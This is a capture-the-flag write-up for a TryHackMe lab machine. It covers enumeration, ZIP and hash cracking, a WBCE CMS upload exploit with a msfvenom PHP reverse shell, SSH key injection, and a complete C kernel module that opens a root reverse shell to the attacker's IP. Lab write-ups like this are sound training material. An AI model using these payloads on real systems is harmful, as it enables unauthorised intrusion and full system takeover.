# 🛡️ Hello guys, welcome to this THM *Avengers Hub* write-up!

---

## 🧭 Step 0 – Preparation

Before diving into the challenge, here’s our setup:

- **My IP (attacker)**: `10.20.20.20`  
- **Target IP (target)**: `10.30.02.20`

---

## 🔎 Step 1 – Scanning the Target with Nmap

To begin, we perform a basic **version scan** using Nmap to detect open ports and identify the services running on the target machine.

```bash
nmap -sV 10.30.02.20
```

> 💡 The `-sV` flag enables service version detection.

---

## 🌐 Step 2 – Exploring the Web Server

Open port 80 hosts a web server. Visiting it shows a **"Site under maintenance"** message. This usually means there might be hidden directories.

---

## 🧪 Step 3 – Directory Enumeration

Use tools like `dirsearch`, `gobuster`, or `ffuf`. In our case:

```bash
python3 dirsearch.py -u http://10.30.02.20
```

We discover a few directories. By exploring them, we find a suspicious file: `breakglass.zip`.

---

## 📦 Step 4 – Cracking the ZIP File

We found a ZIP file, but it’s password-protected. To access its content, we need to crack the password.

First, we use `zip2john`, a tool that extracts a hash from the ZIP file. This hash represents the encrypted password and can be used by John the Ripper.

```bash
zip2john breakglass.zip > hash.txt
```

This creates a `hash.txt` file that contains the ZIP’s password hash.

Then, we use `john` (John the Ripper) to try to crack the password using a wordlist — here, we use the classic `rockyou.txt` list:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```


## 🧾 Step 5 – Extracting and Decrypting the Admin Password

Inside the ZIP, we find a file with an **MD5 hash** for the admin password. Try to decrypt it online (e.g., https://md5decrypt.net).

🎉 We recover the admin password.

---

## 🧑‍💻 Step 6 – Accessing the Admin Interface (WBCE CMS)

The CMS is **WBCE 1.6.2**. Searching online shows an exploit using `.inc` file upload:

https://www.exploit-db.com/exploits/52039

`.inc` files can be executed like `.php` on misconfigured servers.

---

## 🐚 Step 7 – Reverse Shell via WBCE CMS Exploit

Generate a PHP reverse shell in `.inc` format:

```bash
msfvenom -p php/reverse_php LHOST=10.20.20.20 LPORT=4444 -f raw > shell.inc
```

Set up a listener:

```bash
nc -lvnp 4444
```

Upload `shell.inc` to `/media/` in the CMS and trigger it in the browser.

🎉 You now have a shell as `www-data`.

---

## 🧍‍♂️ Step 8 – Privilege Escalation to User

Check who you are:

```bash
whoami
```

Then look for users:

```bash
ls /home/
```

Suppose we find the user `void` and the folder `/home/void/.ssh/` is **writable**.

---

## 🔑 Step 9 – SSH Key Injection

On your machine, generate a key:

```bash
ssh-keygen -t rsa -b 4096 -f mykey
cat mykey.pub
```

Copy the content and inject it into the target:

```bash
echo "PASTE_YOUR_SSH_PUBLIC_KEY_HERE" > /home/void/.ssh/authorized_keys
```

Then connect via SSH:

```bash
ssh -i mykey void@10.30.02.20
```

🎉 You now have user access.

```bash
cat /home/void/flag.txt
```

---

## 👑 Step 10 – Escalating to Root with a Kernel Module

Check what we can do with sudo:

```bash
sudo -l
```

We see permission to run `/sbin/insmod`, which loads a `.ko` kernel module.

> ⚠️ Important: The target machine already has `make` and kernel headers, so we’ll compile the module **directly on the target**.

---

## 🛠️ Step 11 – Creating the Kernel Module on the Target

### On the target, create `cyberavengers.c`:

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/delay.h>

#define REMOTE_IP "10.20.20.20"
#define REMOTE_PORT "8888"

static int reverse_shell_thread(void *data)
{
    char *argv[] = { "/bin/bash", "-c",
        "bash -i >& /dev/tcp/" REMOTE_IP "/" REMOTE_PORT " 0>&1", NULL };
    char *envp[] = { "PATH=/usr/bin:/bin", NULL };

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    return 0;
}

static int __init rev_init(void)
{
    printk(KERN_INFO "Reverse shell module loaded\n");
    kthread_run(reverse_shell_thread, NULL, "rev_shell");
    return 0;
}

static void __exit rev_exit(void)
{
    printk(KERN_INFO "Reverse shell module unloaded\n");
}

module_init(rev_init);
module_exit(rev_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("CTF Participant");
MODULE_DESCRIPTION("Kernel module reverse shell");
```

---

### Still on the target, create `Makefile`:

```makefile
obj-m += cyberavengers.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

---

## 🧨 Step 12 – Compile and Load the Module

### Compile on the target:

```bash
make
```

### Set up a listener on your attacker machine:

```bash
nc -lvnp 8888
```

### Run the module on the target:

```bash
sudo /sbin/insmod cyberavengers.ko
```

🎉 You should now have a **root reverse shell** on your listener!

---

## 🏁 Final Step – Read the Root Flag

```bash
cat /root/flag.txt
```

---

## ✅ Challenge Complete

You've successfully:

- Enumerated services
- Cracked a ZIP and an MD5 hash
- Exploited a file upload vulnerability
- Used SSH key injection for privilege escalation
- Loaded a malicious kernel module for root

🔥 **Great job and happy hacking!**
